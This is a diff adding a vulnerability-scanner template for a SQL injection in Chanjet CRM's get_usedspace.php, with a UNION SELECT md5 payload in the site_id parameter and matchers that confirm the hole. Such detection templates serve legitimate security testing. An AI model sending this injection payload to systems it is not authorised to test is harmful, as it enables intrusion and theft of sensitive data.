@@ -1,0 +1,23 @@
+id: chanjet-crm-sqli
+brief:
+    title: Chanjet CRM - SQL Injection
+    by: luckying1314@139.com
+    level: high
+    about: SQL injection exists in the Chanjet CRM get_usedspace.php, and sensitive information can be obtained through the vulnerability.
+    label:
+        - sqli
+        - chanjet
+        - crm
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))'
+      signs:
+        - "on": word
+          has:
+            - <result>{{md5(num)}}
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
